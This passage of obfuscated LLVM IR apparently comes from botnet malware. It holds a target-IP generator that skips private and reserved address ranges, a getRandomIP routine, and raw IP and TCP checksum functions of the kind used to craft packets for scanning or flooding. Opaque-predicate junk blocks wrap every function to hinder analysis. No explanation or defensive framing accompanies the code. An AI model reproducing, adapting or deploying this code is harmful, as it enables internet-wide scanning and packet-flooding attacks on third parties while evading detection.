  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 127
  br i1 %72, label %281, label %73

; <label>:73:                                     ; preds = %69, %65, %61
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 127
  br i1 %76, label %281, label %77

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 169
  br i1 %80, label %81, label %85

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 254
  br i1 %84, label %281, label %85

; <label>:85:                                     ; preds = %81, %77
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 172
  br i1 %88, label %89, label %97

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sle i32 %91, 16
  br i1 %92, label %93, label %97

; <label>:93:                                     ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp sle i32 %95, 31
  br i1 %96, label %281, label %97

; <label>:97:                                     ; preds = %93, %89, %85
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 192
  br i1 %100, label %101, label %109

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %109

; <label>:105:                                    ; preds = %101
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 2
  br i1 %108, label %281, label %109

; <label>:109:                                    ; preds = %105, %101, %97
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 192
  br i1 %112, label %113, label %137

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* @x.51
  %115 = load i32, i32* @y.52
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %113
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 88
  %125 = load i32, i32* @x.51
  %126 = load i32, i32* @y.52
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %124, label %133, label %137

; <label>:133:                                    ; preds = %originalBBpart24
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 99
  br i1 %136, label %281, label %137

; <label>:137:                                    ; preds = %133, %originalBBpart24, %109
  %138 = load i32, i32* @x.51
  %139 = load i32, i32* @y.52
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %137
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 192
  %149 = load i32, i32* @x.51
  %150 = load i32, i32* @y.52
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %148, label %157, label %177

; <label>:157:                                    ; preds = %originalBBpart28
  %158 = load i32, i32* @x.51
  %159 = load i32, i32* @y.52
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %157
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 168
  %169 = load i32, i32* @x.51
  %170 = load i32, i32* @y.52
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %168, label %281, label %177

; <label>:177:                                    ; preds = %originalBBpart212, %originalBBpart28
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 198
  br i1 %180, label %181, label %189

; <label>:181:                                    ; preds = %177
  %182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 18
  br i1 %184, label %281, label %185

; <label>:185:                                    ; preds = %181
  %186 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 19
  br i1 %188, label %281, label %189

; <label>:189:                                    ; preds = %185, %177
  %190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 198
  br i1 %192, label %193, label %217

; <label>:193:                                    ; preds = %189
  %194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 51
  br i1 %196, label %197, label %217

; <label>:197:                                    ; preds = %193
  %198 = load i32, i32* @x.51
  %199 = load i32, i32* @y.52
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %197
  %206 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 100
  %209 = load i32, i32* @x.51
  %210 = load i32, i32* @y.52
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %208, label %281, label %217

; <label>:217:                                    ; preds = %originalBBpart216, %193, %189
  %218 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 203
  br i1 %220, label %221, label %261

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* @x.51
  %223 = load i32, i32* @y.52
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %221
  %230 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 0
  %233 = load i32, i32* @x.51
  %234 = load i32, i32* @y.52
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %232, label %241, label %261

; <label>:241:                                    ; preds = %originalBBpart220
  %242 = load i32, i32* @x.51
  %243 = load i32, i32* @y.52
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %241
  %250 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 113
  %253 = load i32, i32* @x.51
  %254 = load i32, i32* @y.52
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %252, label %281, label %261

; <label>:261:                                    ; preds = %originalBBpart224, %originalBBpart220, %217
  %262 = load i32, i32* @x.51
  %263 = load i32, i32* @y.52
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %261
  %270 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %271 = zext i8 %270 to i32
  %272 = icmp sge i32 %271, 224
  %273 = load i32, i32* @x.51
  %274 = load i32, i32* @y.52
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %281

; <label>:281:                                    ; preds = %originalBBpart228, %originalBBpart224, %originalBBpart216, %185, %181, %originalBBpart212, %133, %105, %93, %81, %73, %69, %57, %originalBBpart2
  %282 = phi i1 [ true, %originalBBpart224 ], [ true, %originalBBpart216 ], [ true, %185 ], [ true, %181 ], [ true, %originalBBpart212 ], [ true, %133 ], [ true, %105 ], [ true, %93 ], [ true, %81 ], [ true, %73 ], [ true, %69 ], [ true, %57 ], [ true, %originalBBpart2 ], [ %272, %originalBBpart228 ]
  %283 = load i32, i32* @x.51
  %284 = load i32, i32* @y.52
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %281
  %291 = load i32, i32* @x.51
  %292 = load i32, i32* @y.52
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %282, label %299, label %325

; <label>:299:                                    ; preds = %originalBBpart232
  %300 = load i32, i32* @x.51
  %301 = load i32, i32* @y.52
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %299
  %308 = call i32 @rand() #2
  %309 = srem i32 %308, 255
  %310 = trunc i32 %309 to i8
  store i8 %310, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %311 = call i32 @rand() #2
  %312 = srem i32 %311, 255
  %313 = trunc i32 %312 to i8
  store i8 %313, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %314 = call i32 @rand() #2
  %315 = srem i32 %314, 255
  %316 = trunc i32 %315 to i8
  store i8 %316, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %317 = load i32, i32* @x.51
  %318 = load i32, i32* @y.52
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart255, label %originalBB34alteredBB

originalBBpart255:                                ; preds = %originalBB34
  br label %37

; <label>:325:                                    ; preds = %originalBBpart232
  %326 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %326, i8 0, i64 16, i32 16, i1 false)
  %327 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %328 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %329 = zext i8 %328 to i32
  %330 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %331 = zext i8 %330 to i32
  %332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %333 = zext i8 %332 to i32
  %334 = call i32 (i8*, i8*, ...) @szprintf(i8* %327, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i32 0, i32 0), i32 %329, i32 %331, i32 %333)
  %335 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %336 = call i32 @inet_addr(i8* %335) #2
  store i32 %336, i32* %1, align 4
  br label %337

; <label>:337:                                    ; preds = %325, %11
  %338 = load i32, i32* %1, align 4
  ret i32 %338

originalBBalteredBB:                              ; preds = %originalBB, %37
  %339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %340 = zext i8 %339 to i32
  %341 = icmp eq i32 %340, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %113
  %342 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %343 = zext i8 %342 to i32
  %344 = icmp eq i32 %343, 88
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %137
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 192
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %157
  %348 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 168
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %197
  %351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 100
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %221
  %354 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %241
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 113
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %261
  %360 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %361 = zext i8 %360 to i32
  %362 = icmp sge i32 %361, 224
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %281
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %299
  %363 = call i32 @rand() #2
  %_ = sub i32 0, %363
  %gen = add i32 %_, 255
  %364 = srem i32 %363, 255
  %365 = trunc i32 %364 to i8
  store i8 %365, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %366 = call i32 @rand() #2
  %_35 = sub i32 0, %366
  %gen36 = add i32 %_35, 255
  %_37 = sub i32 0, %366
  %gen38 = add i32 %_37, 255
  %_39 = sub i32 %366, 255
  %gen40 = mul i32 %_39, 255
  %_41 = sub i32 0, %366
  %gen42 = add i32 %_41, 255
  %_43 = sub i32 %366, 255
  %gen44 = mul i32 %_43, 255
  %_45 = sub i32 0, %366
  %gen46 = add i32 %_45, 255
  %367 = srem i32 %366, 255
  %368 = trunc i32 %367 to i8
  store i8 %368, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %369 = call i32 @rand() #2
  %_47 = shl i32 %369, 255
  %_48 = shl i32 %369, 255
  %_49 = sub i32 %369, 255
  %gen50 = mul i32 %_49, 255
  %_51 = sub i32 %369, 255
  %gen52 = mul i32 %_51, 255
  %_53 = shl i32 %369, 255
  %370 = srem i32 %369, 255
  %371 = trunc i32 %370 to i8
  store i8 %371, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %originalBB34
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #13
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.53
  %23 = load i32, i32* @y.54
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #13
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = sub i32 0, %33
  %gen = add i32 %_1, %34
  %_2 = sub i32 %33, %34
  %gen3 = mul i32 %_2, %34
  %_4 = sub i32 0, %33
  %gen5 = add i32 %_4, %34
  %_6 = shl i32 %33, %34
  %_7 = sub i32 0, %33
  %gen8 = add i32 %_7, %34
  %_9 = sub i32 %33, %34
  %gen10 = mul i32 %_9, %34
  %_11 = sub i32 %33, %34
  %gen12 = mul i32 %_11, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_13 = shl i32 %38, -1
  %39 = xor i32 %38, -1
  %_14 = sub i32 0, %37
  %gen15 = add i32 %_14, %39
  %_16 = shl i32 %37, %39
  %40 = and i32 %37, %39
  %_17 = shl i32 %36, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.55
  %4 = load i32, i32* @y.56
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.55
  %15 = load i32, i32* @y.56
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %41, %originalBBpart2
  %23 = load i32, i32* @x.55
  %24 = load i32, i32* @y.56
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %12, align 4
  %32 = icmp sgt i32 %31, 1
  %33 = load i32, i32* @x.55
  %34 = load i32, i32* @y.56
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %50

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i16*, i16** %11, align 8
  %43 = getelementptr inbounds i16, i16* %42, i32 1
  store i16* %43, i16** %11, align 8
  %44 = load i16, i16* %42, align 2
  %45 = zext i16 %44 to i64
  %46 = load i64, i64* %13, align 8
  %47 = add i64 %46, %45
  store i64 %47, i64* %13, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sub nsw i32 %48, 2
  store i32 %49, i32* %12, align 4
  br label %22

; <label>:50:                                     ; preds = %originalBBpart24
  %51 = load i32, i32* %12, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %60

; <label>:53:                                     ; preds = %50
  %54 = load i16*, i16** %11, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %13, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %13, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %50
  br label %61

; <label>:61:                                     ; preds = %originalBBpart236, %60
  %62 = load i64, i64* %13, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %87

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.55
  %67 = load i32, i32* @y.56
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i64, i64* %13, align 8
  %75 = and i64 %74, 65535
  %76 = load i64, i64* %13, align 8
  %77 = lshr i64 %76, 16
  %78 = add i64 %75, %77
  store i64 %78, i64* %13, align 8
  %79 = load i32, i32* @x.55
  %80 = load i32, i32* @y.56
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart236, label %originalBB6alteredBB

originalBBpart236:                                ; preds = %originalBB6
  br label %61

; <label>:87:                                     ; preds = %61
  %88 = load i64, i64* %13, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %2
  %91 = alloca i16*, align 8
  %92 = alloca i32, align 4
  %93 = alloca i64, align 8
  store i16* %0, i16** %91, align 8
  store i32 %1, i32* %92, align 4
  store i64 0, i64* %93, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %94 = load i32, i32* %12, align 4
  %95 = icmp sgt i32 %94, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %96 = load i64, i64* %13, align 8
  %_ = sub i64 %96, 65535
  %gen = mul i64 %_, 65535
  %_7 = shl i64 %96, 65535
  %_8 = shl i64 %96, 65535
  %_9 = sub i64 %96, 65535
  %gen10 = mul i64 %_9, 65535
  %_11 = shl i64 %96, 65535
  %_12 = sub i64 %96, 65535
  %gen13 = mul i64 %_12, 65535
  %_14 = sub i64 0, %96
  %gen15 = add i64 %_14, 65535
  %97 = and i64 %96, 65535
  %98 = load i64, i64* %13, align 8
  %_16 = sub i64 %98, 16
  %gen17 = mul i64 %_16, 16
  %_18 = shl i64 %98, 16
  %_19 = sub i64 %98, 16
  %gen20 = mul i64 %_19, 16
  %_21 = shl i64 %98, 16
  %_22 = shl i64 %98, 16
  %_23 = shl i64 %98, 16
  %_24 = sub i64 0, %98
  %gen25 = add i64 %_24, 16
  %_26 = shl i64 %98, 16
  %_27 = sub i64 0, %98
  %gen28 = add i64 %_27, 16
  %99 = lshr i64 %98, 16
  %_29 = sub i64 %97, %99
  %gen30 = mul i64 %_29, %99
  %_31 = sub i64 0, %97
  %gen32 = add i64 %_31, %99
  %_33 = sub i64 %97, %99
  %gen34 = mul i64 %_33, %99
  %100 = add i64 %97, %99
  store i64 %100, i64* %13, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
